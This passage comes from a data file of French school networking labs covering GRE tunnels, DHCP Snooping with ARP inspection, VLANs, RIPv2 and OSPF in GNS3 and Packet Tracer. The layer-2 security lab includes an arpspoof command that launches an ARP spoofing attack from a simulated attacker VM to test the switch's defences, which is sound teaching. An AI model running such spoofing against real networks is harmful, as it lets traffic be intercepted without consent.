        commandes: [
          { os: "linux", cmd: "# Sur R1 :\nR1(config)# interface Tunnel0\nR1(config-if)# ip address 172.16.0.1 255.255.255.252\nR1(config-if)# tunnel source GigabitEthernet0/0\nR1(config-if)# tunnel destination 10.0.0.2\nR1(config-if)# tunnel mode gre ip\nR1(config-if)# no shutdown", commentaire: "Interface Tunnel0 sur R1 : source = IP WAN R1, destination = IP WAN R2" },
          { os: "linux", cmd: "# Sur R2 :\nR2(config)# interface Tunnel0\nR2(config-if)# ip address 172.16.0.2 255.255.255.252\nR2(config-if)# tunnel source GigabitEthernet0/0\nR2(config-if)# tunnel destination 10.0.0.1\nR2(config-if)# tunnel mode gre ip\nR2(config-if)# no shutdown", commentaire: "Interface Tunnel0 sur R2 : source/destination inversées" },
          { os: "linux", cmd: "R1# ping 172.16.0.2", commentaire: "Tester la connectivité à travers le tunnel GRE" }
        ],
        erreurs_courantes: [
          { symptome: "Tunnel state : down/down", cause: "La route vers l'IP destination du tunnel manque ou la connectivité IP sous-jacente est absente", solution: "Vérifier que ping 10.0.0.2 fonctionne AVANT de configurer le tunnel. Le tunnel GRE nécessite une connectivité IP entre les endpoints." }
        ]
      },
      {
        titre: "Étape 3 — Routage à travers le tunnel",
        contexte: "On ajoute des routes statiques pour que les LAN de chaque site se joignent via le tunnel GRE.",
        commandes: [
          { os: "linux", cmd: "# Sur R1 : route vers le LAN du site B via le tunnel :\nR1(config)# ip route 192.168.2.0 255.255.255.0 172.16.0.2", commentaire: "Envoyer le trafic 192.168.2.x dans le tunnel vers R2" },
          { os: "linux", cmd: "# Sur R2 : route vers le LAN du site A :\nR2(config)# ip route 192.168.1.0 255.255.255.0 172.16.0.1", commentaire: "Envoyer le trafic 192.168.1.x dans le tunnel vers R1" },
          { os: "linux", cmd: "R1# ping 192.168.2.1 source GigabitEthernet0/1", commentaire: "Ping depuis le LAN A vers le LAN B à travers le tunnel" },
          { os: "linux", cmd: "R1# show interface Tunnel0", commentaire: "Vérifier l'état du tunnel et les statistiques de paquets encapsulés" }
        ],
        erreurs_courantes: []
      },
      {
        titre: "Étape 4 — MTU et ajustement MSS",
        contexte: "GRE ajoute 24 octets d'overhead. Sur un lien avec MTU 1500, le payload GRE max est 1476. On ajuste le MSS TCP pour éviter la fragmentation.",
        commandes: [
          { os: "linux", cmd: "R1# ping 192.168.2.1 size 1500 df-bit", commentaire: "Tester avec un paquet de 1500 octets sans fragmentation — doit échouer" },
          { os: "linux", cmd: "R1# ping 192.168.2.1 size 1472 df-bit", commentaire: "Taille max sans fragmentation avec GRE (1500 - 24 overhead - 4 options = 1472)" },
          { os: "linux", cmd: "# Ajuster le MSS sur l'interface tunnel :\nR1(config)# interface Tunnel0\nR1(config-if)# ip tcp adjust-mss 1436", commentaire: "Réduire le MSS TCP pour éviter la fragmentation des sessions TCP" }
        ],
        erreurs_courantes: []
      }
    ],
    checklist: [
      "Ping 10.0.0.2 fonctionne avant la configuration du tunnel",
      "Interface Tunnel0 : line protocol is up sur les deux routeurs",
      "Ping 172.16.0.2 depuis R1 : OK (tunnel opérationnel)",
      "Ping 192.168.2.1 source G0/1 depuis R1 : OK (routage LAN-LAN)",
      "show interface Tunnel0 : compteurs de paquets s'incrémentent",
      "Ping size 1500 df-bit échoue, size 1472 réussit (MTU compris)"
    ],
    tags: ["gre", "tunnel", "vpn", "cisco", "gns3", "encapsulation", "wan", "reseau"],
    date_ajout: "2026-06-27",
    source: "École"
  },

  {
    id: 83,
    titre: "DHCP Snooping & DAI — sécurité couche 2 sur switch Cisco",
    categorie: "reseau",
    niveau: "avancé",
    duree: 75,
    description: "Protéger le réseau contre les attaques de couche 2 avec DHCP Snooping (contre les serveurs DHCP pirates) et Dynamic ARP Inspection (contre l'ARP spoofing/poisoning). Configuration sur switch Cisco Catalyst ou IOSv.",
    objectifs: [
      "Comprendre les attaques DHCP starvation et rogue DHCP",
      "Configurer DHCP Snooping et définir les ports de confiance",
      "Comprendre l'attaque ARP spoofing/poisoning",
      "Configurer DAI basé sur la binding table DHCP Snooping",
      "Vérifier et tester les protections"
    ],
    prerequis: [
      { type: "logiciel", nom: "GNS3 2.2+ avec GNS3 VM (VMware ou VirtualBox)", lien: "https://gns3.com" },
      { type: "vm", nom: "1x Cisco vIOS-L2 ou IOU L2 (switch L2 supportant DHCP Snooping et DAI)" },
      { type: "vm", nom: "1x VM Debian 12 serveur DHCP légitime (isc-dhcp-server sur 192.168.1.1) — connectée au port trusted du switch" },
      { type: "vm", nom: "2x VPCS ou VMs Linux clients DHCP — connectés aux ports untrusted" },
      { type: "vm", nom: "1x VM Debian 12 attaquante (dsniff installé pour simuler ARP spoofing)" },
      { type: "reseau", nom: "Réseau de test : VLAN 10, 192.168.1.0/24. Le switch doit supporter ip dhcp snooping et ip arp inspection." }
    ],
    schema_reseau: null,
    etapes: [
      {
        titre: "Étape 1 — Comprendre les attaques et activer DHCP Snooping",
        contexte: "DHCP Snooping crée une table de liaison (binding table) qui associe MAC, IP, VLAN et port. Les ports uplink/serveur sont marqués trusted, les ports clients untrusted. Les messages DHCP Server venant d'un port untrusted sont droppés.",
        commandes: [
          { os: "linux", cmd: "# Activer DHCP Snooping globalement et sur le VLAN :\nSW1(config)# ip dhcp snooping\nSW1(config)# ip dhcp snooping vlan 10", commentaire: "Activer DHCP Snooping sur le VLAN 10" },
          { os: "linux", cmd: "# Marquer l'uplink vers le serveur DHCP comme trusted :\nSW1(config)# interface GigabitEthernet0/1\nSW1(config-if)# ip dhcp snooping trust", commentaire: "Port uplink/serveur DHCP = trusted. Tous les autres ports = untrusted par défaut." },
          { os: "linux", cmd: "# Limiter le débit DHCP sur les ports clients (anti-starvation) :\nSW1(config)# interface GigabitEthernet0/2\nSW1(config-if)# ip dhcp snooping limit rate 10", commentaire: "Maximum 10 paquets DHCP par seconde sur ce port client" },
          { os: "linux", cmd: "SW1# show ip dhcp snooping", commentaire: "Vérifier la configuration DHCP Snooping globale" },
          { os: "linux", cmd: "SW1# show ip dhcp snooping binding", commentaire: "Afficher la binding table : MAC, IP, durée, VLAN, interface" }
        ],
        erreurs_courantes: [
          { symptome: "Les clients ne reçoivent plus d'IP après activation de DHCP Snooping", cause: "Le port vers le serveur DHCP n'est pas marqué trusted — les DHCP Offer sont droppés", solution: "Identifier le port connecté au serveur DHCP légitime et appliquer ip dhcp snooping trust sur ce port uniquement" }
        ]
      },
      {
        titre: "Étape 2 — Configurer Dynamic ARP Inspection",
        contexte: "DAI valide les paquets ARP en les comparant à la binding table DHCP Snooping. Un ARP qui ne correspond pas à la table (MAC/IP incorrects) est droppé — protection contre l'ARP spoofing.",
        commandes: [
          { os: "linux", cmd: "# Activer DAI sur le VLAN 10 :\nSW1(config)# ip arp inspection vlan 10", commentaire: "DAI utilise la binding table DHCP Snooping pour valider les ARP" },
          { os: "linux", cmd: "# Marquer le port uplink comme trusted pour DAI :\nSW1(config)# interface GigabitEthernet0/1\nSW1(config-if)# ip arp inspection trust", commentaire: "Le port uplink doit être trusted pour DAI aussi (sinon les ARP légitimes du routeur sont droppés)" },
          { os: "linux", cmd: "# Limiter le débit ARP sur les ports clients :\nSW1(config)# interface GigabitEthernet0/2\nSW1(config-if)# ip arp inspection limit rate 100", commentaire: "Maximum 100 paquets ARP par seconde — protection contre les floods ARP" }
        ],
        erreurs_courantes: [
          { symptome: "Les clients avec IP statique ont leurs ARP droppés par DAI", cause: "DAI ne trouve pas leur IP dans la binding table DHCP Snooping", solution: "Créer une ARP ACL statique pour les hôtes avec IP fixe : arp access-list STATIQUES > permit ip host 192.168.1.50 mac host AABB.CCDD.EEFF > ip arp inspection filter STATIQUES vlan 10" }
        ]
      },
      {
        titre: "Étape 3 — Vérifier et tester",
        contexte: "On vérifie les protections en place et on observe les logs lors d'une tentative d'attaque simulée.",
        commandes: [
          { os: "linux", cmd: "SW1# show ip arp inspection vlan 10", commentaire: "Statistiques DAI : paquets forwarded et droppés par VLAN" },
          { os: "linux", cmd: "SW1# show ip arp inspection interfaces", commentaire: "État DAI par interface : trusted/untrusted, rate limit, statistiques" },
          { os: "linux", cmd: "SW1# show ip dhcp snooping statistics", commentaire: "Statistiques DHCP Snooping : messages droppés par type" },
          { os: "linux", cmd: "# Simuler un ARP spoofing depuis un PC attaquant :\n# Sur la VM attaquante Linux :\nsudo apt install dsniff -y\nsudo arpspoof -i eth0 -t 192.168.1.10 192.168.1.1", commentaire: "Tenter une attaque ARP spoofing — le switch doit dropper les ARP invalides" },
          { os: "linux", cmd: "SW1# show ip arp inspection statistics vlan 10", commentaire: "Vérifier que les ARP de l'attaquant sont bien comptabilisés comme droppés" }
        ],
        erreurs_courantes: []
      }
    ],
    checklist: [
      "show ip dhcp snooping : DHCP Snooping activé sur VLAN 10",
      "Port serveur DHCP marqué trusted : GigabitEthernet0/1 = trusted",
      "show ip dhcp snooping binding : clients DHCP présents dans la table",
      "show ip arp inspection vlan 10 : DAI activé",
      "Tentative ARP spoofing : paquets droppés visibles dans les statistiques DAI",
      "Clients avec IP DHCP : communication normale non perturbée"
    ],
    tags: ["dhcp-snooping", "dai", "arp-inspection", "securite-l2", "cisco", "switch", "arp-spoofing", "reseau"],
    date_ajout: "2026-06-27",
    source: "École"
  }

,

  {
    id: 103,
    titre: "Packet Tracer — prise en main et topologie LAN de base",
    categorie: "reseau",
    niveau: "débutant",
    duree: 45,
    description: "Découvrir Cisco Packet Tracer, le simulateur réseau gratuit de Cisco. Créer une topologie LAN simple avec des switches et des PCs, configurer les adresses IP, tester la connectivité avec ping et explorer les modes de simulation. Idéal pour débuter sans avoir besoin d'images IOS.",
    objectifs: [
      "Naviguer dans l'interface Packet Tracer (mode Logical et Physical)",
      "Placer des équipements et les connecter avec les bons câbles",
      "Configurer les adresses IP sur des PCs et des interfaces de switch",
      "Tester la connectivité avec ping en mode temps réel et simulation",
      "Utiliser le mode simulation pour observer les trames Ethernet"
    ],
    prerequis: [
      { type: "logiciel", nom: "Cisco Packet Tracer 8.x installé (gratuit avec compte Cisco NetAcad)", lien: "https://www.netacad.com/cisco-packet-tracer" },
      { type: "reseau", nom: "Aucun prérequis réseau — TP d'initiation" }
    ],
    schema_reseau: null,
    etapes: [
      {
        titre: "Étape 1 — Découvrir l'interface Packet Tracer",
        contexte: "Packet Tracer propose deux espaces de travail : Logical (schéma réseau) et Physical (représentation physique). On travaille principalement en mode Logical. La barre du bas contient les équipements disponibles (Routers, Switches, End Devices...).",
        commandes: [
          { os: "both", cmd: "# Télécharger et installer Packet Tracer :\n# 1. Créer un compte gratuit sur netacad.com\n# 2. Télécharger Packet Tracer 8.x\n# 3. S'authentifier au premier lancement avec le compte NetAcad", commentaire: "Installation et premier lancement de Packet Tracer" },
          { os: "both", cmd: "# Zones clés de l'interface :\n# Barre du bas gauche : catégories d'équipements (Routers, Switches, End Devices...)\n# Barre du bas droite : modèles disponibles dans la catégorie sélectionnée\n# Zone centrale : espace de travail (drag & drop)\n# Barre d'outils : sélection, suppression, note, PDU complexe\n# En haut à droite : bouton Simulation (horloge)", commentaire: "Repérer les zones clés de l'interface" }
        ],
        erreurs_courantes: [
          { symptome: "Packet Tracer demande une connexion internet au lancement", cause: "Authentification avec le compte NetAcad requise", solution: "Créer un compte gratuit sur netacad.com. Une fois authentifié, Packet Tracer fonctionne hors ligne." }
        ]
      },
      {
        titre: "Étape 2 — Créer la topologie LAN",
        contexte: "On construit une topologie simple : 1 switch Cisco 2960 connecté à 3 PCs. On utilise des câbles droits (Copper Straight-Through) pour les connexions PC-Switch.",
        commandes: [
          { os: "both", cmd: "# Placer les équipements :\n# 1. Catégorie Switches > Cisco 2960 > glisser dans l'espace de travail\n# 2. Catégorie End Devices > PC > glisser 3 PCs\n# 3. Nommer : double-clic sur chaque équipement > onglet Config > Display Name", commentaire: "Placer 1 switch 2960 et 3 PCs, les renommer PC1, PC2, PC3" },
          { os: "both", cmd: "# Connecter les équipements :\n# 1. Cliquer sur l'icône éclair (Connections) dans la barre du bas\n# 2. Sélectionner Copper Straight-Through (câble droit orange)\n# 3. Cliquer sur PC1 > sélectionner FastEthernet0\n# 4. Cliquer sur le Switch > sélectionner FastEthernet0/1\n# Répéter pour PC2 (Fa0/2) et PC3 (Fa0/3)", commentaire: "Câbles droits PC -> Switch (les voyants doivent passer au vert)" }
        ],
        erreurs_courantes: [
          { symptome: "Les voyants des câbles restent orange", cause: "STP (Spanning Tree) en convergence — normal au démarrage", solution: "Attendre 30-60 secondes que les ports passent en état Forwarding (vert). Pour accélérer : sur le switch, configurer spanning-tree portfast sur les ports PC." }
        ]
      },
      {
        titre: "Étape 3 — Configurer les adresses IP",
        contexte: "On configure les IPs sur les PCs directement depuis leur interface graphique (Desktop > IP Configuration).",
        commandes: [
          { os: "both", cmd: "# Sur PC1 : cliquer sur PC1 > onglet Desktop > IP Configuration\n# IP Address    : 192.168.1.10\n# Subnet Mask   : 255.255.255.0\n# Default Gateway: 192.168.1.1 (pas de routeur ici, laisser vide ou 0.0.0.0)", commentaire: "Configurer l'IP de PC1" },
          { os: "both", cmd: "# PC2 : 192.168.1.20 / 255.255.255.0\n# PC3 : 192.168.1.30 / 255.255.255.0", commentaire: "Configurer les IPs de PC2 et PC3" },
          { os: "both", cmd: "# Tester la connectivité :\n# PC1 > Desktop > Command Prompt\n> ping 192.168.1.20\n> ping 192.168.1.30", commentaire: "Ping depuis PC1 vers PC2 et PC3 — doit réussir (TTL=128)" }
        ],
        erreurs_courantes: []
      },
      {
        titre: "Étape 4 — Mode simulation Packet Tracer",
        contexte: "Le mode simulation permet d'observer les paquets en transit étape par étape. On peut voir les trames Ethernet, les PDU et comprendre ce qui se passe à chaque couche.",
        commandes: [
          { os: "both", cmd: "# Activer le mode simulation :\n# Bouton Simulation (horloge) en bas à droite OU touche Shift+F2\n# Filtrer uniquement ICMP dans Event List Filters", commentaire: "Passer en mode simulation et filtrer ICMP" },
          { os: "both", cmd: "# Envoyer un ping en simulation :\n# PC1 > Desktop > Command Prompt > ping 192.168.1.20\n# Cliquer sur Play dans le panneau Simulation\n# Observer les enveloppes se déplacer PC1 -> Switch -> PC2", commentaire: "Observer la propagation du ping en mode simulation" },
          { os: "both", cmd: "# Cliquer sur une enveloppe en transit pour inspecter le PDU :\n# Onglet Inbound PDU / Outbound PDU\n# Observer les couches OSI : L2 (Ethernet : MAC src/dst) et L3 (IP : src/dst)", commentaire: "Inspecter les détails du paquet à chaque étape" }
        ],
        erreurs_courantes: []
      }
    ],
    checklist: [
      "Packet Tracer installé et authentifié avec compte NetAcad",
      "Topologie : 1 switch 2960 + 3 PCs connectés avec câbles droits",
      "Voyants des câbles verts (ports en état Forwarding)",
      "IPs configurées : PC1=.10, PC2=.20, PC3=.30 /24",
      "Ping PC1 -> PC2 : Success (0% loss)",
      "Mode simulation : enveloppes ICMP visibles et PDU inspecté"
    ],
    tags: ["packet-tracer", "cisco", "lan", "switch", "ping", "simulation", "debutant", "reseau"],
    date_ajout: "2026-06-27",
    source: "École"
  },

  {
    id: 104,
    titre: "Packet Tracer — VLANs, trunks et inter-VLAN routing",
    categorie: "reseau",
    niveau: "débutant",
    duree: 60,
    description: "Configurer les VLANs sur des switches Cisco 2960 dans Packet Tracer : création des VLANs, assignation des ports en mode access, configuration d'un trunk entre switches et mise en place du routage inter-VLAN avec un routeur (Router-on-a-Stick).",
    objectifs: [
      "Créer des VLANs sur un switch Cisco 2960",
      "Assigner des ports en mode access à un VLAN",
      "Configurer un trunk 802.1Q entre deux switches",
      "Configurer le Router-on-a-Stick pour le routage inter-VLAN",
      "Tester la connectivité intra-VLAN et inter-VLAN"
    ],
    prerequis: [
      { type: "logiciel", nom: "Cisco Packet Tracer 8.x installé", lien: "https://www.netacad.com/cisco-packet-tracer" },
      { type: "reseau", nom: "TP Packet Tracer de base maîtrisé (id:103 recommandé)" },
      { type: "reseau", nom: "Topologie : 1x routeur Cisco 2811 ou ISR, 2x switches Cisco 2960, 4x PCs" },
      { type: "reseau", nom: "Adressage : VLAN 10 = 192.168.10.0/24, VLAN 20 = 192.168.20.0/24" }
    ],
    schema_reseau: null,
    etapes: [
      {
        titre: "Étape 1 — Créer les VLANs sur les switches",
        contexte: "On crée VLAN 10 (Informatique) et VLAN 20 (RH) sur les deux switches. Les VLANs doivent être créés sur chaque switch indépendamment (ou propagés via VTP).",
        commandes: [
          { os: "linux", cmd: "# Sur SW1 et SW2 :\nSW1> enable\nSW1# configure terminal\nSW1(config)# vlan 10\nSW1(config-vlan)# name Informatique\nSW1(config)# vlan 20\nSW1(config-vlan)# name RH\nSW1(config)# end\nSW1# show vlan brief", commentaire: "Créer VLAN 10 et VLAN 20 sur les deux switches" }
        ],
        erreurs_courantes: []
      },
      {
        titre: "Étape 2 — Assigner les ports access et configurer le trunk",
        contexte: "On assigne les ports des PCs au bon VLAN (mode access) et on configure le lien entre les deux switches en mode trunk pour transporter tous les VLANs.",
        commandes: [
          { os: "linux", cmd: "# Ports access sur SW1 :\nSW1(config)# interface FastEthernet0/1\nSW1(config-if)# switchport mode access\nSW1(config-if)# switchport access vlan 10\nSW1(config)# interface FastEthernet0/2\nSW1(config-if)# switchport mode access\nSW1(config-if)# switchport access vlan 20", commentaire: "PC1 en VLAN 10, PC2 en VLAN 20 sur SW1" },
          { os: "linux", cmd: "# Trunk entre SW1 et SW2 (port GigabitEthernet0/1) :\nSW1(config)# interface GigabitEthernet0/1\nSW1(config-if)# switchport mode trunk\nSW1(config-if)# switchport trunk allowed vlan 10,20\nSW2(config)# interface GigabitEthernet0/1\nSW2(config-if)# switchport mode trunk\nSW2(config-if)# switchport trunk allowed vlan 10,20", commentaire: "Trunk 802.1Q entre SW1 et SW2 autorisant VLAN 10 et 20" },
          { os: "linux", cmd: "SW1# show interfaces trunk", commentaire: "Vérifier le trunk : port en mode trunk, VLANs autorisés et actifs" }
        ],
        erreurs_courantes: [
          { symptome: "show interfaces trunk : aucun port trunk affiché", cause: "Les deux extrémités du lien ne sont pas en mode trunk", solution: "Configurer switchport mode trunk des deux côtés du lien. Vérifier avec show interfaces Gi0/1 switchport." }
        ]
      },
      {
        titre: "Étape 3 — Router-on-a-Stick",
        contexte: "Un seul lien physique entre le switch et le routeur transporte les deux VLANs tagués. Le routeur crée deux sous-interfaces (subinterfaces), une par VLAN, pour le routage inter-VLAN.",
        commandes: [
          { os: "linux", cmd: "# Trunk SW1 -> Routeur (port Fa0/5 du switch vers Fa0/0 du routeur) :\nSW1(config)# interface FastEthernet0/5\nSW1(config-if)# switchport mode trunk", commentaire: "Port trunk vers le routeur sur SW1" },
          { os: "linux", cmd: "# Sous-interfaces sur le routeur :\nR1(config)# interface FastEthernet0/0\nR1(config-if)# no shutdown\nR1(config)# interface FastEthernet0/0.10\nR1(config-subif)# encapsulation dot1Q 10\nR1(config-subif)# ip address 192.168.10.1 255.255.255.0\nR1(config)# interface FastEthernet0/0.20\nR1(config-subif)# encapsulation dot1Q 20\nR1(config-subif)# ip address 192.168.20.1 255.255.255.0", commentaire: "Sous-interface .10 = passerelle VLAN 10, .20 = passerelle VLAN 20" }
        ],
        erreurs_courantes: [
          { symptome: "Pas de routage inter-VLAN malgré la configuration", cause: "Default gateway des PCs non configurée ou interface physique Fa0/0 non activée", solution: "Configurer la default gateway sur chaque PC (192.168.10.1 pour VLAN 10, 192.168.20.1 pour VLAN 20). Vérifier que no shutdown est appliqué sur Fa0/0." }
        ]
      },
      {
        titre: "Étape 4 — Tester la connectivité",
        contexte: "On teste la communication intra-VLAN (même VLAN) et inter-VLAN (via le routeur).",
        commandes: [
          { os: "linux", cmd: "# Depuis PC1 (VLAN 10, 192.168.10.10) :\n> ping 192.168.10.20    # PC3 même VLAN 10 -> doit réussir\n> ping 192.168.20.10    # PC2 VLAN 20 via routeur -> doit réussir\n> ping 192.168.10.1     # passerelle VLAN 10 -> doit réussir", commentaire: "Tests intra-VLAN et inter-VLAN depuis PC1" },
          { os: "linux", cmd: "R1# show ip route", commentaire: "Vérifier les routes directement connectées pour 192.168.10.0 et 192.168.20.0" }
        ],
        erreurs_courantes: []
      }
    ],
    checklist: [
      "show vlan brief : VLAN 10 et 20 actifs sur les deux switches",
      "show interfaces trunk : lien SW1-SW2 en trunk avec VLANs 10,20",
      "Sous-interfaces Fa0/0.10 et Fa0/0.20 configurées avec encapsulation dot1Q",
      "Ping intra-VLAN (PC1 -> PC3, même VLAN 10) : Success",
      "Ping inter-VLAN (PC1 VLAN10 -> PC2 VLAN20 via routeur) : Success",
      "show ip route sur R1 : routes C pour 192.168.10.0 et 192.168.20.0"
    ],
    tags: ["packet-tracer", "vlan", "trunk", "dot1q", "router-on-a-stick", "cisco", "2960", "reseau"],
    date_ajout: "2026-06-27",
    source: "École"
  },

  {
    id: 105,
    titre: "Packet Tracer — routage statique et RIP v2",
    categorie: "reseau",
    niveau: "débutant",
    duree: 60,
    description: "Configurer le routage entre plusieurs réseaux dans Packet Tracer : d'abord avec des routes statiques, puis avec le protocole dynamique RIPv2. Comprendre les tables de routage et observer la convergence automatique de RIP.",
    objectifs: [
      "Configurer des adresses IP sur les interfaces de routeurs Cisco",
      "Ajouter des routes statiques et vérifier la table de routage",
      "Configurer RIPv2 comme protocole de routage dynamique",
      "Observer la convergence RIP et les mises à jour de routage",
      "Comparer routes statiques vs dynamiques"
    ],
    prerequis: [
      { type: "logiciel", nom: "Cisco Packet Tracer 8.x installé", lien: "https://www.netacad.com/cisco-packet-tracer" },
      { type: "reseau", nom: "Topologie : 3x routeurs Cisco 2811 (R1, R2, R3) en série, 3x PCs (un par réseau LAN)" },
      { type: "reseau", nom: "Adressage WAN : R1-R2 = 10.0.12.0/30, R2-R3 = 10.0.23.0/30" },
      { type: "reseau", nom: "Adressage LAN : LAN1 = 192.168.1.0/24, LAN2 = 192.168.2.0/24, LAN3 = 192.168.3.0/24" }
    ],
    schema_reseau: null,
    etapes: [
      {
        titre: "Étape 1 — Configurer les interfaces des routeurs",
        contexte: "On configure les adresses IP sur toutes les interfaces et on les active avec no shutdown. Dans Packet Tracer, les routeurs 2811 ont des interfaces FastEthernet et Serial.",
        commandes: [
          { os: "linux", cmd: "# R1 :\nR1(config)# interface FastEthernet0/0\nR1(config-if)# ip address 192.168.1.1 255.255.255.0\nR1(config-if)# no shutdown\nR1(config)# interface FastEthernet0/1\nR1(config-if)# ip address 10.0.12.1 255.255.255.252\nR1(config-if)# no shutdown", commentaire: "R1 : LAN 192.168.1.1 + lien WAN vers R2 10.0.12.1" },
          { os: "linux", cmd: "# R2 :\nR2(config)# interface FastEthernet0/0\nR2(config-if)# ip address 192.168.2.1 255.255.255.0\nR2(config-if)# no shutdown\nR2(config)# interface FastEthernet0/1\nR2(config-if)# ip address 10.0.12.2 255.255.255.252\nR2(config-if)# no shutdown\nR2(config)# interface FastEthernet1/0\nR2(config-if)# ip address 10.0.23.1 255.255.255.252\nR2(config-if)# no shutdown", commentaire: "R2 : LAN + lien vers R1 + lien vers R3" },
          { os: "linux", cmd: "# Vérifier :\nR1# show ip interface brief", commentaire: "Toutes les interfaces doivent être up/up" }
        ],
        erreurs_courantes: [
          { symptome: "Interface FastEthernet administratively down", cause: "no shutdown non appliqué sur l'interface", solution: "Dans Packet Tracer, les interfaces sont down par défaut. Toujours appliquer no shutdown après avoir configuré l'IP." }
        ]
      },
      {
        titre: "Étape 2 — Routes statiques",
        contexte: "On configure les routes statiques sur chaque routeur pour que tous les réseaux soient joignables. R1 doit connaître le chemin vers 192.168.2.0 et 192.168.3.0.",
        commandes: [
          { os: "linux", cmd: "# Sur R1 :\nR1(config)# ip route 192.168.2.0 255.255.255.0 10.0.12.2\nR1(config)# ip route 192.168.3.0 255.255.255.0 10.0.12.2\nR1(config)# ip route 10.0.23.0 255.255.255.252 10.0.12.2", commentaire: "R1 envoie tout vers R2 (next-hop 10.0.12.2)" },
          { os: "linux", cmd: "# Sur R3 :\nR3(config)# ip route 192.168.1.0 255.255.255.0 10.0.23.1\nR3(config)# ip route 192.168.2.0 255.255.255.0 10.0.23.1\nR3(config)# ip route 10.0.12.0 255.255.255.252 10.0.23.1", commentaire: "R3 envoie tout vers R2 (next-hop 10.0.23.1)" },
          { os: "linux", cmd: "R1# show ip route\nPC1> ping 192.168.3.10", commentaire: "Vérifier la table de routage et tester la connectivité end-to-end" }
        ],
        erreurs_courantes: []
      },
      {
        titre: "Étape 3 — Configurer RIPv2 (remplacer les routes statiques)",
        contexte: "On supprime les routes statiques et on configure RIPv2 sur les trois routeurs. RIP va automatiquement propager les informations de routage.",
        commandes: [
          { os: "linux", cmd: "# Supprimer les routes statiques :\nR1(config)# no ip route 192.168.2.0 255.255.255.0 10.0.12.2\nR1(config)# no ip route 192.168.3.0 255.255.255.0 10.0.12.2\nR1(config)# no ip route 10.0.23.0 255.255.255.252 10.0.12.2", commentaire: "Supprimer toutes les routes statiques avant d'activer RIP" },
          { os: "linux", cmd: "# Configurer RIPv2 sur R1, R2 et R3 :\nR1(config)# router rip\nR1(config-router)# version 2\nR1(config-router)# no auto-summary\nR1(config-router)# network 192.168.1.0\nR1(config-router)# network 10.0.12.0", commentaire: "RIPv2 sur R1 — annoncer les réseaux directement connectés" },
          { os: "linux", cmd: "# Attendre la convergence (30 secondes max) puis vérifier :\nR1# show ip route rip\nR1# show ip rip database", commentaire: "Les routes R (RIP) doivent apparaître pour les réseaux distants" }
        ],
        erreurs_courantes: [
          { symptome: "Aucune route RIP après configuration", cause: "auto-summary activé avec des réseaux discontiguës, ou network manquant", solution: "Toujours utiliser no auto-summary avec RIPv2. Vérifier que tous les réseaux directement connectés sont déclarés avec network." }
        ]
      }
    ],
    checklist: [
      "show ip interface brief : toutes les interfaces up/up",
      "Routes statiques : ping PC1 -> PC3 réussit",
      "RIPv2 configuré sur R1, R2, R3 avec no auto-summary",
      "show ip route rip : routes R visibles sur R1 pour 192.168.2.0 et 192.168.3.0",
      "Ping PC1 -> PC3 réussit après suppression routes statiques et activation RIP"
    ],
    tags: ["packet-tracer", "routage-statique", "rip", "ripv2", "cisco", "table-routage", "reseau"],
    date_ajout: "2026-06-27",
    source: "École"
  },

  {
    id: 106,
    titre: "Packet Tracer — OSPF mono-zone et multi-zone",
    categorie: "reseau",
    niveau: "intermédiaire",
    duree: 75,
    description: "Configurer OSPF dans Packet Tracer : d'abord en mono-zone (Area 0 uniquement) puis en multi-zone avec un ABR. Observer les états de voisinage OSPF, les élections DR/BDR et les routes O et O IA dans la table de routage.",
    objectifs: [
      "Configurer OSPF mono-zone entre plusieurs routeurs",
      "Observer les états de voisinage (Down, Init, 2-Way, Full)",
      "Identifier le DR et BDR sur un segment multi-accès",
      "Configurer OSPF multi-zone avec ABR",
      "Distinguer les routes O (intra-zone) et O IA (inter-zone)"
    ],
    prerequis: [
      { type: "logiciel", nom: "Cisco Packet Tracer 8.x installé", lien: "https://www.netacad.com/cisco-packet-tracer" },
      { type: "reseau", nom: "Topologie OSPF mono-zone : 3x routeurs Cisco 2811 (R1, R2, R3) connectés en triangle" },
      { type: "reseau", nom: "Adressage : R1-R2=10.0.12.0/30, R1-R3=10.0.13.0/30, R2-R3=10.0.23.0/30, LANs=192.168.x.0/24" },
      { type: "reseau", nom: "Pour la partie multi-zone : ajouter R4 connecté à R2 (Area 1)" }
    ],
    schema_reseau: null,
    etapes: [
      {
        titre: "Étape 1 — OSPF mono-zone Area 0",
        contexte: "On configure OSPF process 1 sur les trois routeurs. Tous les réseaux sont dans Area 0. On précise le router-id explicitement pour éviter les changements inattendus.",
        commandes: [
          { os: "linux", cmd: "# Sur R1 :\nR1(config)# router ospf 1\nR1(config-router)# router-id 1.1.1.1\nR1(config-router)# network 192.168.1.0 0.0.0.255 area 0\nR1(config-router)# network 10.0.12.0 0.0.0.3 area 0\nR1(config-router)# network 10.0.13.0 0.0.0.3 area 0", commentaire: "OSPF R1 : annoncer tous les réseaux dans Area 0 avec wildcard masks" },
          { os: "linux", cmd: "# Même logique sur R2 (router-id 2.2.2.2) et R3 (router-id 3.3.3.3)\nR1# show ip ospf neighbor", commentaire: "Vérifier les voisinages — état Full = adjacence complète établie" },
          { os: "linux", cmd: "R1# show ip route ospf", commentaire: "Routes O pour les réseaux des autres routeurs" }
        ],
        erreurs_courantes: [
          { symptome: "Voisins OSPF en état 2-Way mais jamais Full", cause: "Sur un réseau point-à-point, l'état Full est normal. Sur un LAN, si un routeur reste en 2-Way, il n'est pas DR ni BDR.", solution: "Vérifier le type de réseau avec show ip ospf interface. Sur un lien point-à-point, les deux routeurs passent directement en Full sans DR/BDR." }
        ]
      },
      {
        titre: "Étape 2 — Élection DR/BDR",
        contexte: "Sur les segments multi-accès (LAN), OSPF élit un DR et un BDR pour réduire le nombre d'adjacences. On observe l'élection et on la manipule avec les priorités.",
        commandes: [
          { os: "linux", cmd: "R1# show ip ospf interface FastEthernet0/0", commentaire: "Voir le rôle DR/BDR/DROther sur l'interface LAN et la priorité (défaut = 1)" },
          { os: "linux", cmd: "# Forcer R1 à devenir DR :\nR1(config)# interface FastEthernet0/0\nR1(config-if)# ip ospf priority 100", commentaire: "Priorité 100 > 1 par défaut — R1 sera DR après réélection" },
          { os: "linux", cmd: "# Forcer un routeur à ne jamais être DR :\nR3(config)# interface FastEthernet0/0\nR3(config-if)# ip ospf priority 0", commentaire: "Priorité 0 = jamais DR ni BDR" }
        ],
        erreurs_courantes: []
      },
      {
        titre: "Étape 3 — OSPF multi-zone avec ABR",
        contexte: "On ajoute R4 connecté à R2 dans Area 1. R2 devient ABR (Area Border Router) avec un pied en Area 0 et un pied en Area 1.",
        commandes: [
